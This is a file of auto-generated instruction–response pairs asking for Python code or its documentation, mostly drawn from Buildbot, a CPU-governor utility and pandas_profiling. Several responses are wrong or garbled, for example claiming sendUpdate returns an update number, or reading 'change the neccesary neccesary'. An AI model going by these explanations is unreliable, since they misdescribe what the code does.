{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef sendUpdate(self, data):\n\n        if not self.running:\n            # .running comes from service.Service, and says whether the\n            # service is running or not. If we aren't running, don't send any\n            # status messages.\n            return\n        # the update[1]=0 comes from the leftover 'updateNum', which the\n        # master still expects to receive. Provide it to avoid significant\n        # interoperability issues between new workers and old masters.\n        if self.remoteStep:\n            update = [data, 0]\n            updates = [update]\n            d = self.remoteStep.callRemote(\"update\", updates)\n            d.addCallback(self.ackUpdate)\n            d.addErrback(self._ackFailed, \"WorkerForBuilder.sendUpdate\")", "response": "This method sends the status update to the master - side\n            object and returns the number of the update."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef recordHostname(self, basedir):\n        \"Record my hostname in twistd.hostname, for user convenience\"\n        log.msg(\"recording hostname in twistd.hostname\")\n        filename = os.path.join(basedir, \"twistd.hostname\")\n\n        try:\n            hostname = os.uname()[1]  # only on unix\n        except AttributeError:\n            # this tends to fail on non-connected hosts, e.g., laptops\n            # on planes\n            hostname = socket.getfqdn()\n\n        try:\n            with open(filename, \"w\") as f:\n                f.write(\"{0}\\n\".format(hostname))\n        except Exception:\n            log.msg(\"failed - ignoring\")", "response": "Record my hostname in twistd. hostname for user convenience"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nwalk upwards from the current directory until we find this topfile", "response": "def getTopdir(topfile, start=None):\n    \"\"\"walk upwards from the current directory until we find this topfile\"\"\"\n    if not start:\n        start = os.getcwd()\n    here = start\n    toomany = 20\n    while toomany > 0:\n        if os.path.exists(os.path.join(here, topfile)):\n            return here\n        next = os.path.dirname(here)\n        if next == here:\n            break                       # we've hit the root\n        here = next\n        toomany -= 1\n    output(\"Unable to find topfile '{}' anywhere \"\n           \"from {} upwards\".format(topfile, start))\n    sys.exit(1)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef dovc(self, cmd):\n        env = os.environ.copy()\n        env['LC_ALL'] = \"C\"\n        d = utils.getProcessOutputAndValue(self.exe, cmd, env=env,\n                                           path=self.treetop)\n        d.addCallback(self._didvc, cmd)\n        return d", "response": "This accepts the arguments of a command without the actual\n        command itself."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a Deferred that fires with a SourceStamp instance.", "response": "def get(self):\n        \"\"\"Return a Deferred that fires with a SourceStamp instance.\"\"\"\n        d = self.getBaseRevision()\n        d.addCallback(self.getPatch)\n        d.addCallback(self.done)\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nversioning of check_output which does not throw error", "response": "def check_output(cmd):\n    \"\"\"Version of check_output which does not throw error\"\"\"\n    popen = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    out = popen.communicate()[0].strip()\n    if not isinstance(out, str):\n        out = out.decode(sys.stdout.encoding)\n    return out"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef getVersionFromArchiveId(git_archive_id='$Format:%ct %d$'):\n    # mangle the magic string to make sure it is not replaced by git archive\n    if not git_archive_id.startswith('$For''mat:'):\n        # source was modified by git archive, try to parse the version from\n        # the value of git_archive_id\n\n        match = re.search(r'tag:\\s*v([^,)]+)', git_archive_id)\n        if match:\n            # archived revision is tagged, use the tag\n            return gitDescribeToPep440(match.group(1))\n\n        # archived revision is not tagged, use the commit date\n        tstamp = git_archive_id.strip().split()[0]\n        d = datetime.datetime.utcfromtimestamp(int(tstamp))\n        return d.strftime('%Y.%m.%d')\n    return None", "response": "Extract the version of a source from git archive."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the version of the current build.", "response": "def getVersion(init_file):\n    \"\"\"\n    Return BUILDBOT_VERSION environment variable, content of VERSION file, git\n    tag or 'latest'\n    \"\"\"\n\n    try:\n        return os.environ['BUILDBOT_VERSION']\n    except KeyError:\n        pass\n\n    try:\n        cwd = os.path.dirname(os.path.abspath(init_file))\n        fn = os.path.join(cwd, 'VERSION')\n        with open(fn) as f:\n            return f.read().strip()\n    except IOError:\n        pass\n\n    version = getVersionFromArchiveId()\n    if version is not None:\n        return version\n\n    try:\n        p = Popen(['git', 'describe', '--tags', '--always'], stdout=PIPE, stderr=STDOUT, cwd=cwd)\n        out = p.communicate()[0]\n\n        if (not p.returncode) and out:\n            v = gitDescribeToPep440(str(out))\n            if v:\n                return v\n    except OSError:\n        pass\n\n    try:\n        # if we really can't find the version, we use the date of modification of the most recent file\n        # docker hub builds cannot use git describe\n        return mTimeVersion(init_file)\n    except Exception:\n        # bummer. lets report something\n        return \"latest\""}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_commit_msg(self, repo, sha):\n        '''\n        :param repo: the repo full name, ``{owner}/{project}``.\n            e.g. ``buildbot/buildbot``\n        '''\n        headers = {\n            'User-Agent': 'Buildbot'\n        }\n        if self._token:\n            headers['Authorization'] = 'token ' + self._token\n\n        url = '/repos/{}/commits/{}'.format(repo, sha)\n        http = yield httpclientservice.HTTPClientService.getService(\n            self.master, self.github_api_endpoint, headers=headers,\n            debug=self.debug, verify=self.verify)\n        res = yield http.get(url)\n        data = yield res.json()\n        msg = data.get('commit', {'message': 'No message field'})['message']\n        return msg", "response": "Get the message of a commit."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _process_change(self, payload, user, repo, repo_url, project, event,\n                        properties):\n        \"\"\"\n        Consumes the JSON as a python object and actually starts the build.\n\n        :arguments:\n            payload\n                Python Object that represents the JSON sent by GitHub Service\n                Hook.\n        \"\"\"\n        changes = []\n        refname = payload['ref']\n\n        # We only care about regular heads or tags\n        match = re.match(r\"^refs/(heads|tags)/(.+)$\", refname)\n        if not match:\n            log.msg(\"Ignoring refname `{}': Not a branch\".format(refname))\n            return changes\n        category = None  # None is the legacy category for when hook only supported push\n        if match.group(1) == \"tags\":\n            category = \"tag\"\n\n        branch = match.group(2)\n        if payload.get('deleted'):\n            log.msg(\"Branch `{}' deleted, ignoring\".format(branch))\n            return changes\n\n        # check skip pattern in commit message. e.g.: [ci skip] and [skip ci]\n        head_msg = payload['head_commit'].get('message', '')\n        if self._has_skip(head_msg):\n            return changes\n        commits = payload['commits']\n        if payload.get('created'):\n            commits = [payload['head_commit']]\n        for commit in commits:\n            files = []\n            for kind in ('added', 'modified', 'removed'):\n                files.extend(commit.get(kind, []))\n\n            when_timestamp = dateparse(commit['timestamp'])\n\n            log.msg(\"New revision: {}\".format(commit['id'][:8]))\n\n            change = {\n                'author': '{} <{}>'.format(commit['author']['name'],\n                                           commit['author']['email']),\n                'files': files,\n                'comments': commit['message'],\n                'revision': commit['id'],\n                'when_timestamp': when_timestamp,\n                'branch': branch,\n                'revlink': commit['url'],\n                'repository': repo_url,\n                'project': project,\n                'properties': {\n                    'github_distinct': commit.get('distinct', True),\n                    'event': event,\n                },\n                'category': category\n            }\n            # Update with any white-listed github event properties\n            change['properties'].update(properties)\n\n            if callable(self._codebase):\n                change['codebase'] = self._codebase(payload)\n            elif self._codebase is not None:\n                change['codebase'] = self._codebase\n\n            changes.append(change)\n\n        return changes", "response": "Processes a change from GitHub Service and returns a list of dictionaries that represents the changes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking if the message contains the skipping keyword.", "response": "def _has_skip(self, msg):\n        '''\n        The message contains the skipping keyword no not.\n\n        :return type: Bool\n        '''\n        for skip in self.skips:\n            if re.search(skip, msg):\n                return True\n        return False"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef createSummary(self, log):\n        warnings = self.obs.warnings\n        errors = self.obs.errors\n\n        if warnings:\n            self.addCompleteLog('%d Warnings' % len(warnings), \"\\n\".join(warnings))\n            self.warnCount = len(warnings)\n        if errors:\n            self.addCompleteLog('%d Errors' % len(errors), \"\\n\".join(errors))\n            self.errCount = len(errors)", "response": "Create nice summary logs."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nwrites a block of data to the remote writer", "response": "def _writeBlock(self):\n        \"\"\"Write a block of data to the remote writer\"\"\"\n\n        if self.interrupted or self.fp is None:\n            if self.debug:\n                log.msg('WorkerFileUploadCommand._writeBlock(): end')\n            return True\n\n        length = self.blocksize\n        if self.remaining is not None and length > self.remaining:\n            length = self.remaining\n\n        if length <= 0:\n            if self.stderr is None:\n                self.stderr = 'Maximum filesize reached, truncating file \\'{0}\\''.format(\n                    self.path)\n                self.rc = 1\n            data = ''\n        else:\n            data = self.fp.read(length)\n\n        if self.debug:\n            log.msg('WorkerFileUploadCommand._writeBlock(): ' +\n                    'allowed={0} readlen={1}'.format(length, len(data)))\n        if not data:\n            log.msg(\"EOF: callRemote(close)\")\n            return True\n\n        if self.remaining is not None:\n            self.remaining = self.remaining - len(data)\n            assert self.remaining >= 0\n        d = self.writer.callRemote('write', data)\n        d.addCallback(lambda res: False)\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nread a block of data from the remote reader.", "response": "def _readBlock(self):\n        \"\"\"Read a block of data from the remote reader.\"\"\"\n\n        if self.interrupted or self.fp is None:\n            if self.debug:\n                log.msg('WorkerFileDownloadCommand._readBlock(): end')\n            return True\n\n        length = self.blocksize\n        if self.bytes_remaining is not None and length > self.bytes_remaining:\n            length = self.bytes_remaining\n\n        if length <= 0:\n            if self.stderr is None:\n                self.stderr = \"Maximum filesize reached, truncating file '{0}'\".format(\n                    self.path)\n                self.rc = 1\n            return True\n        else:\n            d = self.reader.callRemote('read', length)\n            d.addCallback(self._writeData)\n            return d"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef formatMessageForBuildResults(self, mode, buildername, buildset, build, master, previous_results, blamelist):\n        ss_list = buildset['sourcestamps']\n        results = build['results']\n\n        ctx = dict(results=build['results'],\n                   mode=mode,\n                   buildername=buildername,\n                   workername=build['properties'].get(\n                       'workername', [\"<unknown>\"])[0],\n                   buildset=buildset,\n                   build=build,\n                   projects=self.getProjects(ss_list, master),\n                   previous_results=previous_results,\n                   status_detected=self.getDetectedStatus(\n                       mode, results, previous_results),\n                   build_url=utils.getURLForBuild(\n                       master, build['builder']['builderid'], build['number']),\n                   buildbot_url=master.config.buildbotURL,\n                   blamelist=blamelist,\n                   summary=self.messageSummary(build, results),\n                   sourcestamps=self.messageSourceStamps(ss_list)\n                   )\n        yield self.buildAdditionalContext(master, ctx)\n        msgdict = self.renderMessage(ctx)\n        return msgdict", "response": "Generate a buildbot mail message and return a dictionary\n           containing the message body type and subject."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fullName(self):\n        # join with '_' if both are set (cannot put '.', because it is used as\n        # **kwargs)\n        if self.parentName and self.name:\n            return self.parentName + '_' + self.name\n        # otherwise just use the one that is set\n        # (this allows empty name for \"anonymous nests\")\n        return self.name or self.parentName", "response": "A full name for the current object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef getFromKwargs(self, kwargs):\n        args = kwargs.get(self.fullName, [])\n\n        # delete white space for args\n        for arg in args:\n            if isinstance(arg, str) and not arg.strip():\n                args.remove(arg)\n\n        if not args:\n            if self.required:\n                raise ValidationError(\n                    \"'%s' needs to be specified\" % (self.label))\n            if self.multiple:\n                args = self.default\n            else:\n                args = [self.default]\n\n        if self.regex:\n            for arg in args:\n                if not self.regex.match(arg):\n                    raise ValidationError(\"%s:'%s' does not match pattern '%s'\"\n                                          % (self.label, arg, self.regex.pattern))\n        if self.maxsize is not None:\n            for arg in args:\n                if len(arg) > self.maxsize:\n                    raise ValidationError(\"%s: is too large %d > %d\"\n                                          % (self.label, len(arg), self.maxsize))\n\n        try:\n            arg = self.parse_from_args(args)\n        except Exception as e:\n            # an exception will just display an alert in the web UI\n            # also log the exception\n            if self.debug:\n                traceback.print_exc()\n            raise e\n        if arg is None:\n            raise ValidationError(\"need %s: no default provided by config\"\n                                  % (self.fullName,))\n        return arg", "response": "Simple customization point for child classes that do not need the other\n           parameters supplied to updateFromKwargs."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef updateFromKwargs(self, properties, kwargs, collector, **unused):\n        properties[self.name] = self.getFromKwargs(kwargs)", "response": "Update the properties dictionary with the values from the kwargs."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_from_args(self, l):\n        if self.multiple:\n            return [self.parse_from_arg(arg) for arg in l]\n        return self.parse_from_arg(l[0])", "response": "Secondary customization point called from getFromKwargs to turn\n           a validated value into a single property value"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncollapse the child values into a dictionary. This is intended to be called by child classes to fix up the fullName - > name conversions.", "response": "def collectChildProperties(self, kwargs, properties, collector, **kw):\n        \"\"\"Collapse the child values into a dictionary. This is intended to be\n           called by child classes to fix up the fullName->name conversions.\"\"\"\n\n        childProperties = {}\n        for field in self.fields:  # pylint: disable=not-an-iterable\n            yield collector.collectValidationErrors(field.fullName,\n                                                    field.updateFromKwargs,\n                                                    kwargs=kwargs,\n                                                    properties=childProperties,\n                                                    collector=collector,\n                                                    **kw)\n        kwargs[self.fullName] = childProperties"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef updateFromKwargs(self, kwargs, properties, collector, **kw):\n        yield self.collectChildProperties(kwargs=kwargs, properties=properties,\n                                          collector=collector, **kw)\n        # default behavior is to set a property\n        #  -- use setdefault+update in order to collapse 'anonymous' nested\n        #     parameters correctly\n        if self.name:\n            d = properties.setdefault(self.name, {})\n        else:\n            # if there's no name, collapse this nest all the way\n            d = properties\n        d.update(kwargs[self.fullName])", "response": "Update the properties of the object based on the keyword arguments."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef force(self, owner, builderNames=None, builderid=None, **kwargs):\n        builderNames = yield self.computeBuilderNames(builderNames, builderid)\n        if not builderNames:\n            raise KeyError(\"builderNames not specified or not supported\")\n\n        # Currently the validation code expects all kwargs to be lists\n        # I don't want to refactor that now so much sure we comply...\n        kwargs = dict((k, [v]) if not isinstance(v, list) else (k, v)\n                      for k, v in kwargs.items())\n\n        # probably need to clean that out later as the IProperty is already a\n        # validation mechanism\n        collector = ValidationErrorCollector()\n        reason = yield collector.collectValidationErrors(self.reason.fullName,\n                                                         self.reason.getFromKwargs, kwargs)\n        if owner is None or owner == \"anonymous\":\n            owner = yield collector.collectValidationErrors(self.username.fullName,\n                                                            self.username.getFromKwargs, kwargs)\n\n        properties, changeids, sourcestamps = yield self.gatherPropertiesAndChanges(\n            collector, **kwargs)\n\n        collector.maybeRaiseCollectedErrors()\n\n        properties.setProperty(\"reason\", reason, \"Force Build Form\")\n        properties.setProperty(\"owner\", owner, \"Force Build Form\")\n\n        r = self.reasonString % {'owner': owner, 'reason': reason}\n\n        # turn sourcestamps into a list\n        for cb, ss in sourcestamps.items():\n            ss['codebase'] = cb\n        sourcestamps = list(sourcestamps.values())\n\n        # everything is validated, we can create our source stamp, and\n        # buildrequest\n        res = yield self.addBuildsetForSourceStampsWithDefaults(\n            reason=r,\n            sourcestamps=sourcestamps,\n            properties=properties,\n            builderNames=builderNames,\n        )\n\n        return res", "response": "Create a new buildset for this source stamp."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, secret, *args, **kwargs):\n        for provider in self.services:\n            value = yield provider.get(secret)\n            source_name = provider.__class__.__name__\n            if value is not None:\n                return SecretDetails(source_name, secret, value)", "response": "get secrets from the provider defined in the secret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsaving function save function", "response": "def save():\n    \"\"\"\n    save function\n    \"\"\"\n    results = {}\n    cpu_number = 0\n\n    while True:\n        try:\n            _file = open(\n                CPU_PREFIX + 'cpu{}/cpufreq/scaling_governor'.format(cpu_number))\n        except:\n            break\n\n        governor = _file.read().strip()\n        results.setdefault(cpu_number, {})['governor'] = governor\n\n        _file.close()\n\n        try:\n            _file = open(\n                CPU_PREFIX + 'cpu{}/cpufreq/scaling_cur_freq'.format(cpu_number))\n        except:\n            break\n\n        results[cpu_number]['freq'] = _file.read().strip()\n\n        _file.close()\n\n        cpu_number += 1\n\n    return results"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nchange the neccesary neccesary", "response": "def change(governor, freq=None):\n    \"\"\"\n    change function\n    \"\"\"\n    cpu_number = 0\n\n    while True:\n        try:\n            subprocess.check_output([\n                \"sudo\", \"bash\", \"-c\",\n                \"echo {governor} > {CPU_PREFIX}cpu{cpu_number}/cpufreq/scaling_governor\"\n                .format(governor=governor,\n                        CPU_PREFIX=CPU_PREFIX,\n                        cpu_number=cpu_number)],\n                                    stderr=subprocess.STDOUT)\n        except:\n            break\n\n        if freq:\n            subprocess.check_output([\n                \"sudo\", \"bash\", \"-c\",\n                \"echo {freq} > {CPU_PREFIX}cpu{cpu_number}/cpufreq/scaling_setspeed\"\n                .format(freq=freq,\n                        CPU_PREFIX=CPU_PREFIX,\n                        cpu_number=cpu_number)],\n                                    stderr=subprocess.STDOUT)\n\n        cpu_number += 1"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nfunctioning for checking available frequency", "response": "def available_freq():\n    \"\"\"\n    function for checking available frequency\n    \"\"\"\n    _file = open(CPU_PREFIX + 'cpu0/cpufreq/scaling_available_frequencies')\n\n    freq = [int(_file) for _file in _file.read().strip().split()]\n\n    _file.close()\n\n    return freq"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndumping function for the", "response": "def dump():\n    \"\"\"\n    dump function\n    \"\"\"\n\n    try:\n        sensors = subprocess.check_output('sensors').decode('utf-8')\n\n    except (FileNotFoundError, subprocess.CalledProcessError):\n        print(\"Couldn't read CPU temp\")\n\n    else:\n        cores = []\n\n        for line in sensors.splitlines():\n            if line.startswith('Core '):\n                core, rest = line.split(':')\n                temp = rest.strip().split()[0]\n                cores.append((core, temp))\n\n        for core, temp in cores:\n            print(core + ':', temp)\n\n    cpu_number = 0\n\n    while True:\n        try:\n            _file = open(\n                CPU_PREFIX + 'cpu{}/cpufreq/scaling_governor'.format(cpu_number))\n        except:\n            break\n\n        print('Core ' + str(cpu_number) + ':', _file.read().strip(), end=', ')\n\n        _file.close()\n\n        try:\n            _file = open(\n                CPU_PREFIX + 'cpu{}/cpufreq/scaling_cur_freq'.format(cpu_number))\n        except:\n            break\n\n        freq = round(int(_file.read()) / 10 ** 6, 2)\n\n        print(freq, 'GHz')\n\n        cpu_number += 1"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef padto8(data):\n    length = len(data)\n    return data + b'\\xdb' * (roundto8(length) - length)", "response": "Pads data to the multiplies of 8 bytes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nparse a cookie string into a dict of name value pairs.", "response": "def parse_cookie(cookie):\n    \"\"\"Parse a ``Cookie`` HTTP header into a dict of name/value pairs.\n    This function attempts to mimic browser cookie parsing behavior;\n    it specifically does not follow any of the cookie-related RFCs\n    (because browsers don't either).\n    The algorithm used is identical to that used by Django version 1.9.10.\n    \"\"\"\n    cookiedict = {}\n    for chunk in cookie.split(str(';')):\n        if str('=') in chunk:\n            key, val = chunk.split(str('='), 1)\n        else:\n            # Assume an empty name per\n            # https://bugzilla.mozilla.org/show_bug.cgi?id=169091\n            key, val = str(''), chunk\n        key, val = key.strip(), val.strip()\n        if key or val:\n            # unquote using Python's algorithm.\n            cookiedict[key] = unquote_cookie(val)\n    return cookiedict"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_rejected_variables(self, threshold=0.9):\n        variable_profile = self.description_set['variables']\n        result = []\n        if hasattr(variable_profile, 'correlation'):\n            result = variable_profile.index[variable_profile.correlation > threshold].tolist()\n        return  result", "response": "Return a list of variable names being rejected for high\n            correlation with one of remaining variables."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nwrite the report to a file.", "response": "def to_file(self, outputfile=DEFAULT_OUTPUTFILE):\n        \"\"\"Write the report to a file.\n        \n        By default a name is generated.\n\n        Parameters:\n        ----------\n        outputfile : str\n            The name or the path of the file to generale including the extension (.html).\n        \"\"\"\n    \n        if outputfile != NO_OUTPUTFILE:\n            if outputfile == DEFAULT_OUTPUTFILE:\n                outputfile = 'profile_' + str(hash(self)) + \".html\"\n            # TODO: should be done in the template\n            with codecs.open(outputfile, 'w+b', encoding='utf8') as self.file:\n                self.file.write(templates.template('wrapper').render(content=self.html))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a Jinja template ready for rendering.", "response": "def template(template_name):\n    \"\"\"Return a jinja template ready for rendering. If needed, global variables are initialized.\n\n    Parameters\n    ----------\n    template_name: str, the name of the template as defined in the templates mapping\n\n    Returns\n    -------\n    The Jinja template ready for rendering\n    \"\"\"\n    globals = None\n    if template_name.startswith('row_'):\n        # This is a row template setting global variable\n        globals = dict()\n        globals['vartype'] = var_type[template_name.split('_')[1].upper()]\n    return jinja2_env.get_template(templates[template_name], globals=globals)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef to_html(sample, stats_object):\n\n    n_obs = stats_object['table']['n']\n\n    value_formatters = formatters.value_formatters\n    row_formatters = formatters.row_formatters\n\n    if not isinstance(sample, pd.DataFrame):\n        raise TypeError(\"sample must be of type pandas.DataFrame\")\n\n    if not isinstance(stats_object, dict):\n        raise TypeError(\"stats_object must be of type dict. Did you generate this using the pandas_profiling.describe() function?\")\n\n    if not set({'table', 'variables', 'freq', 'correlations'}).issubset(set(stats_object.keys())):\n        raise TypeError(\n            \"stats_object badly formatted. Did you generate this using the pandas_profiling.describe() function?\")\n\n    def fmt(value, name):\n        if pd.isnull(value):\n            return \"\"\n        if name in value_formatters:\n            return value_formatters[name](value)\n        elif isinstance(value, float):\n            return value_formatters[formatters.DEFAULT_FLOAT_FORMATTER](value)\n        else:\n            try:\n                return unicode(value)  # Python 2\n            except NameError:\n                return str(value)      # Python 3\n                \n\n    def _format_row(freq, label, max_freq, row_template, n, extra_class=''):\n            if max_freq != 0:\n                width = int(freq / max_freq * 99) + 1\n            else:\n                width = 1\n\n            if width > 20:\n                label_in_bar = freq\n                label_after_bar = \"\"\n            else:\n                label_in_bar = \"&nbsp;\"\n                label_after_bar = freq\n\n            return row_template.render(label=label,\n                                       width=width,\n                                       count=freq,\n                                       percentage='{:2.1f}'.format(freq / n * 100),\n                                       extra_class=extra_class,\n                                       label_in_bar=label_in_bar,\n                                       label_after_bar=label_after_bar)\n\n    def freq_table(freqtable, n, table_template, row_template, max_number_to_print, nb_col=6):\n\n        freq_rows_html = u''\n\n        if max_number_to_print > n:\n                max_number_to_print=n\n\n        if max_number_to_print < len(freqtable):\n            freq_other = sum(freqtable.iloc[max_number_to_print:])\n            min_freq = freqtable.values[max_number_to_print]\n        else:\n            freq_other = 0\n            min_freq = 0\n\n        freq_missing = n - sum(freqtable)\n        max_freq = max(freqtable.values[0], freq_other, freq_missing)\n\n        # TODO: Correctly sort missing and other\n\n        for label, freq in six.iteritems(freqtable.iloc[0:max_number_to_print]):\n            freq_rows_html += _format_row(freq, label, max_freq, row_template, n)\n\n        if freq_other > min_freq:\n            freq_rows_html += _format_row(freq_other,\n                                         \"Other values (%s)\" % (freqtable.count() - max_number_to_print), max_freq, row_template, n,\n                                         extra_class='other')\n\n        if freq_missing > min_freq:\n            freq_rows_html += _format_row(freq_missing, \"(Missing)\", max_freq, row_template, n, extra_class='missing')\n\n        return table_template.render(rows=freq_rows_html, varid=hash(idx), nb_col=nb_col)\n\n    def extreme_obs_table(freqtable, table_template, row_template, number_to_print, n, ascending = True):\n\n        # If it's mixed between base types (str, int) convert to str. Pure \"mixed\" types are filtered during type discovery\n        if \"mixed\" in freqtable.index.inferred_type:\n            freqtable.index = freqtable.index.astype(str)\n\n        sorted_freqTable = freqtable.sort_index()\n\n        if ascending:\n            obs_to_print = sorted_freqTable.iloc[:number_to_print]\n        else:\n            obs_to_print = sorted_freqTable.iloc[-number_to_print:]\n\n        freq_rows_html = ''\n        max_freq = max(obs_to_print.values)\n\n        for label, freq in six.iteritems(obs_to_print):\n            freq_rows_html += _format_row(freq, label, max_freq, row_template, n)\n\n        return table_template.render(rows=freq_rows_html)\n\n    # Variables\n    rows_html = u\"\"\n    messages = []\n    render_htmls = {}\n\n    for idx, row in stats_object['variables'].iterrows():\n\n        formatted_values = {'varname': idx, 'varid': hash(idx)}\n        row_classes = {}\n\n        for col, value in six.iteritems(row):\n            formatted_values[col] = fmt(value, col)\n\n        for col in set(row.index) & six.viewkeys(row_formatters):\n            row_classes[col] = row_formatters[col](row[col])\n            if row_classes[col] == \"alert\" and col in templates.messages:\n                messages.append(templates.messages[col].format(formatted_values, varname = idx))\n\n        if row['type'] in {'CAT', 'BOOL'}:\n            formatted_values['minifreqtable'] = freq_table(stats_object['freq'][idx], n_obs,\n                                                           templates.template('mini_freq_table'), \n                                                           templates.template('mini_freq_table_row'), \n                                                           3, \n                                                           templates.mini_freq_table_nb_col[row['type']])\n\n            if row['distinct_count'] > 50:\n                messages.append(templates.messages['HIGH_CARDINALITY'].format(formatted_values, varname = idx))\n                row_classes['distinct_count'] = \"alert\"\n            else:\n                row_classes['distinct_count'] = \"\"\n\n        if row['type'] == 'UNIQUE':\n            obs = stats_object['freq'][idx].index\n\n            formatted_values['firstn'] = pd.DataFrame(obs[0:3], columns=[\"First 3 values\"]).to_html(classes=\"example_values\", index=False)\n            formatted_values['lastn'] = pd.DataFrame(obs[-3:], columns=[\"Last 3 values\"]).to_html(classes=\"example_values\", index=False)\n        if row['type'] == 'UNSUPPORTED':\n            formatted_values['varname'] = idx\n            messages.append(templates.messages[row['type']].format(formatted_values))\n        elif row['type'] in {'CORR', 'CONST', 'RECODED'}:\n            formatted_values['varname'] = idx\n            messages.append(templates.messages[row['type']].format(formatted_values))\n        else:\n            formatted_values['freqtable'] = freq_table(stats_object['freq'][idx], n_obs,\n                                                       templates.template('freq_table'), templates.template('freq_table_row'), 10)\n            formatted_values['firstn_expanded'] = extreme_obs_table(stats_object['freq'][idx], templates.template('freq_table'), templates.template('freq_table_row'), 5, n_obs, ascending = True)\n            formatted_values['lastn_expanded'] = extreme_obs_table(stats_object['freq'][idx], templates.template('freq_table'), templates.template('freq_table_row'), 5, n_obs, ascending = False)\n\n        rows_html += templates.row_templates_dict[row['type']].render(values=formatted_values, row_classes=row_classes)\n    render_htmls['rows_html'] = rows_html\n\n    # Overview\n    formatted_values = {k: fmt(v, k) for k, v in six.iteritems(stats_object['table'])}\n\n    row_classes={}\n    for col in six.viewkeys(stats_object['table']) & six.viewkeys(row_formatters):\n        row_classes[col] = row_formatters[col](stats_object['table'][col])\n        if row_classes[col] == \"alert\" and col in templates.messages:\n            messages.append(templates.messages[col].format(formatted_values, varname = idx))\n\n    messages_html = u''\n    for msg in messages:\n        messages_html += templates.message_row.format(message=msg)\n\n    overview_html = templates.template('overview').render(values=formatted_values, row_classes = row_classes, messages=messages_html)\n    render_htmls['overview_html'] = overview_html\n\n    # Add plot of matrix correlation if the dataframe is not empty\n    if len(stats_object['correlations']['pearson']) > 0:\n        pearson_matrix = plot.correlation_matrix(stats_object['correlations']['pearson'], 'Pearson')\n        spearman_matrix = plot.correlation_matrix(stats_object['correlations']['spearman'], 'Spearman')\n        correlations_html = templates.template('correlations').render(\n            values={'pearson_matrix': pearson_matrix, 'spearman_matrix': spearman_matrix})\n        render_htmls['correlations_html'] = correlations_html\n\n    # Add sample\n    sample_html = templates.template('sample').render(sample_table_html=sample.to_html(classes=\"sample\"))\n    render_htmls['sample_html'] = sample_html\n\n    # TODO: should be done in the template\n    return templates.template('base').render(render_htmls)", "response": "Generate a HTML report from summary statistics and a given sample."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncomputes summary statistics of a numeric variable.", "response": "def describe_numeric_1d(series, **kwargs):\n    \"\"\"Compute summary statistics of a numerical (`TYPE_NUM`) variable (a Series).\n\n    Also create histograms (mini an full) of its distribution.\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n    # Format a number as a percentage. For example 0.25 will be turned to 25%.\n    _percentile_format = \"{:.0%}\"\n    stats = dict()\n    stats['type'] = base.TYPE_NUM\n    stats['mean'] = series.mean()\n    stats['std'] = series.std()\n    stats['variance'] = series.var()\n    stats['min'] = series.min()\n    stats['max'] = series.max()\n    stats['range'] = stats['max'] - stats['min']\n    # To avoid to compute it several times\n    _series_no_na = series.dropna()\n    for percentile in np.array([0.05, 0.25, 0.5, 0.75, 0.95]):\n        # The dropna() is a workaround for https://github.com/pydata/pandas/issues/13098\n        stats[_percentile_format.format(percentile)] = _series_no_na.quantile(percentile)\n    stats['iqr'] = stats['75%'] - stats['25%']\n    stats['kurtosis'] = series.kurt()\n    stats['skewness'] = series.skew()\n    stats['sum'] = series.sum()\n    stats['mad'] = series.mad()\n    stats['cv'] = stats['std'] / stats['mean'] if stats['mean'] else np.NaN\n    stats['n_zeros'] = (len(series) - np.count_nonzero(series))\n    stats['p_zeros'] = stats['n_zeros'] * 1.0 / len(series)\n    # Histograms\n    stats['histogram'] = histogram(series, **kwargs)\n    stats['mini_histogram'] = mini_histogram(series, **kwargs)\n    return pd.Series(stats, name=series.name)"}
